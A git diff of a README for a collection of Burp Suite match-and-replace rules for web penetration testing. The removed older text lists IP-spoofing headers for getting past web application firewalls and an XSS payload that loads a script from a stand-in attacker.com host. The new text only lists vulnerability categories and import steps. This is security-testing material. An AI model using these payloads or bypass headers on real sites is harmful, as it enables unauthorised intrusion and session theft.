@@ -1,107 +1,160 @@
-# BurpSuite Match & Replace 
-BurpSuite Match & Replace Rules For Different UseCases
+# Burp Suite Match and Replace Rules
 
-## Finding hidden buttons, forms, and other UI elements
-Many websites contain hidden buttons, forms, and other UI elements like
-```html
-<div aria-hidden="true"></div>
-<div style="visibility: hidden;"></div>
-<div style="display: none;"></div>
-<script>document.getElementbyTagName("test").hidden=true</script>
-<button type="button" disabled>test</button>
-```
+This repository contains a comprehensive collection of **Burp Suite Match and Replace rules** for various vulnerability categories. These rules are designed to aid penetration testers and security researchers in efficiently testing web applications for common and advanced vulnerabilities. Each set of rules is tailored to a specific use case and helps in automating the injection of payloads into HTTP requests and responses.
 
-* Show Hidden UI (1)
+## Table of Contents
+- [Introduction](#introduction)
+- [Categories and Use Cases](#categories-and-use-cases)
+  - [API Testing](#api-testing)
+  - [Authentication](#authentication)
+  - [Authorization](#authorization)
+  - [Broken Access Control](#broken-access-control)
+  - [Business Logic Testing](#business-logic-testing)
+  - [Command Injection](#command-injection)
+  - [CORS (Cross-Origin Resource Sharing)](#cors-cross-origin-resource-sharing)
+  - [CSRF (Cross-Site Request Forgery)](#csrf-cross-site-request-forgery)
+  - [File Upload](#file-upload)
+  - [General Rules](#general-rules)
+  - [GraphQL](#graphql)
+  - [Host Header Injection](#host-header-injection)
+  - [HTML Injection](#html-injection)
+  - [IDOR (Insecure Direct Object Reference)](#idor-insecure-direct-object-reference)
+  - [JWT (JSON Web Token)](#jwt-json-web-token)
+  - [LFI (Local File Inclusion)](#lfi-local-file-inclusion)
+  - [NoSQL Injection](#nosql-injection)
+  - [OAuth Testing](#oauth-testing)
+  - [Open Redirect](#open-redirect)
+  - [Privilege Escalation](#privilege-escalation)
+  - [RFI (Remote File Inclusion)](#rfi-remote-file-inclusion)
+  - [SQL Injection](#sql-injection)
+  - [SSRF (Server-Side Request Forgery)](#ssrf-server-side-request-forgery)
+  - [SSTI (Server-Side Template Injection)](#ssti-server-side-template-injection)
+  - [WAF General Rules](#waf-general-rules)
+  - [WAF Bypass Payloads](#waf-bypass-payloads)
+  - [Web Cache Poisoning](#web-cache-poisoning)
+  - [XSS (Cross-Site Scripting)](#xss-cross-site-scripting)
+  - [XXE (XML External Entity)](#xxe-xml-external-entity)
+- [How to Use](#how-to-use)
+- [Contributing](#contributing)
+- [License](#license)
 
-<img src="https://user-images.githubusercontent.com/36522826/166728753-b5b04276-fdf0-4102-bfee-7ac8fcd96cd4.png" width="400" />
+---
 
-* Show Hidden UI (2)
+## Introduction
 
-<img src="https://user-images.githubusercontent.com/36522826/166728896-5fb0c698-50bb-4213-b227-6389afaf3854.png" width="400" />
+The **Burp Suite Match and Replace rules** provided in this repository are intended to help security testers automate their workflow when testing web applications. These rules enable users to modify HTTP requests and responses dynamically, allowing them to inject payloads into headers, parameters, cookies, and more.
 
-* Change disable to enable
+Each category includes payloads and rules specific to a particular vulnerability type, ensuring comprehensive test coverage.
 
-<img src="https://user-images.githubusercontent.com/36522826/166729298-56e7272c-86c3-4f08-b712-606568a0367f.png" width="400" />
+---
 
-## Changing `false` to `true`
-Sometimes we can get hidden features by changing from `false` to `true`. The example:
+## Categories and Use Cases
 
-* Changing role from normal user to admin
+### API Testing
+- Modify headers and parameters to test API endpoints for security misconfigurations and vulnerabilities.
 
-<img src="https://user-images.githubusercontent.com/36522826/166739661-a6e54638-0fa1-464e-b765-4d52b7a223f7.png" width="400" />
+### Authentication
+- Rules to test login mechanisms, multi-factor authentication, and session handling.
 
-* Make email verified
+### Authorization
+- Validate access controls by injecting invalid or unauthorized identifiers.
 
-<img src="https://user-images.githubusercontent.com/36522826/166739292-7bf7bd71-3d7b-4ba0-91e2-97b679c41a83.png" width="400" />
+### Broken Access Control
+- Test for improper access restrictions using custom payloads.
 
-## Bypass WAF
-Bypassing WAF by adding some headers
+### Business Logic Testing
+- Inject custom payloads to test for flaws in application workflows.
 
-* Adding `X-Forwarded-Host: 127.0.0.1`
-<img src="https://user-images.githubusercontent.com/36522826/166742712-f3208448-ec62-424f-98ac-db3aecb1326b.png" width="400" />
+### Command Injection
+- Payloads to test for OS command injection vulnerabilities.
 
-> Create another rule but change the header to:
-```
-X-Forwarded-Port: 127.0.0.1
-X-Forwarded-By: 127.0.0.1
-X-Forwarded-Scheme: 127.0.0.1
-X-Frame-Options: Allow
-X-Forwarded-For: 127.0.0.1
-X-Client-IP: 127.0.0.1
-X-Real-IP: 127.0.0.1
-X-Originating-IP: 127.0.0.1
-X-Remote-IP: 127.0.0.1
-X-Remote-Addr: 127.0.0.1
-X-Cluster-Client-IP: 127.0.0.1
-True-Client-IP: 127.0.0.1
-Client-IP: 127.0.0.1
-Origin: null
-Origin: Domain.attacker.com
-```
+### CORS (Cross-Origin Resource Sharing)
+- Rules to test CORS configurations for security weaknesses.
 
-## Finding IDOR
-By changing original user UUID to another UUID
+### CSRF (Cross-Site Request Forgery)
+- Inject anti-CSRF token bypass techniques and test token validation mechanisms.
 
-<img src="https://user-images.githubusercontent.com/36522826/166742159-f740ec61-cb94-4ee7-bacf-7ed5b00e26bb.png" width="400" />
+### File Upload
+- Test file upload functionality for insecure handling and bypass techniques.
 
-> Create another rule but change the `type` to "Request First Line"
+### General Rules
+- Basic rules to test general application security.
 
-## Finding XSS
-By adding some XSS payload into the request
+### GraphQL
+- Inject payloads to test GraphQL endpoints for security issues like over-fetching or unauthorized access.
 
-* Finding XSS on `User-Agent`
+### Host Header Injection
+- Test applications for host header injection vulnerabilities.
 
-<img src="https://user-images.githubusercontent.com/36522826/166749425-b9accf44-a606-473d-94c6-8e9562e02c07.png" width="400" />
+### HTML Injection
+- Payloads to test for insecure rendering of HTML content.
 
-* Finding XSS on `Referer`
+### IDOR (Insecure Direct Object Reference)
+- Test for IDOR vulnerabilities in applications exposing sensitive object references.
 
-<img src="https://user-images.githubusercontent.com/36522826/166749753-d68eea0a-e290-4658-a2f1-cf66fcd89342.png" width="400" />
+### JWT (JSON Web Token)
+- Inject payloads to test for vulnerabilities in JWT handling and verification.
 
-* Auto replace user input with XSS payload
+### LFI (Local File Inclusion)
+- Payloads to test for file inclusion vulnerabilities in local file systems.
 
-<img src="https://user-images.githubusercontent.com/36522826/166752610-9d21d86e-49e5-4e8f-86bc-a9134350d46d.png" width="400" />
+### NoSQL Injection
+- Rules to test NoSQL databases for injection vulnerabilities.
 
-> So by just inputting the words `xss_payload` on the website it will be immediately replaced with `"><script src=https://attacker.com></script>`
-> Change the XSS payload as you want
+### OAuth Testing
+- Test OAuth implementations for misconfigurations and vulnerabilities.
 
-## MISC
-Some random match and replace rules
-* Finding [CVE-2021-44228](https://github.com/advisories/GHSA-jfh8-c2jp-5v3q)
+### Open Redirect
+- Test applications for insecure redirection mechanisms.
 
-<img src="https://user-images.githubusercontent.com/36522826/166748175-6782ce51-b10f-4b1d-b8a3-610ef142d567.png" width="400" />
+### Privilege Escalation
+- Test for unauthorized access leading to privilege escalation.
 
-> Create some another rules to look for them in headers, parameters and more. Because log4j can be found anywhere
+### RFI (Remote File Inclusion)
+- Payloads to test for remote file inclusion vulnerabilities.
 
-* Help companies to identify your traffic and separate them from malicious traffic by adding a custom header
+### SQL Injection
+- Rules to test for SQL injection in applications.
 
-<img src="https://user-images.githubusercontent.com/36522826/166796789-e184716f-00a3-428d-9323-bcd985556798.png" width="400" />
+### SSRF (Server-Side Request Forgery)
+- Payloads to test for SSRF vulnerabilities in application endpoints.
 
-References:
-- https://twitter.com/PTestical/status/1413497660133318659
-- https://twitter.com/HolyBugx/status/1355472991061213184
-- https://twitter.com/intigriti/status/1192103070072741894
-- https://twitter.com/payloadartist/status/1469582893772984322
-- https://twitter.com/payloadartist/status/1422247377516122114
-- https://twitter.com/hackerscrolls/status/1247177578269597698
+### SSTI (Server-Side Template Injection)
+- Inject template-specific payloads to test for SSTI vulnerabilities.
 
-> Soon will be updated again
+### WAF General Rules
+- General rules to test web application firewalls for security configurations.
+
+### WAF Bypass Payloads
+- Rules and payloads to bypass web application firewalls.
+
+### Web Cache Poisoning
+- Test applications for vulnerabilities in caching mechanisms.
+
+### XSS (Cross-Site Scripting)
+- Inject payloads to test for reflected, stored, and DOM-based XSS.
+
+### XXE (XML External Entity)
+- Rules to test for XXE vulnerabilities in XML parsers.
+
+---
+
+## How to Use
+
+1. Import the JSON files from this repository into Burp Suite under:
+   - **Proxy > Options > Match and Replace**
+2. Enable the rules relevant to your testing.
+3. Send requests through Burp Suite Proxy to dynamically apply the rules.
+4. Observe the results and identify potential vulnerabilities.
+
+---
+
+## Contributing
+
+Contributions are welcome! If you have new rules or improvements to existing ones, feel free to submit a pull request. Please ensure that your rules are properly tested before submitting.
+
+---
+
+## License
+
+This repository is licensed under the [MIT License](LICENSE). You are free to use, modify, and distribute the contents of this repository.
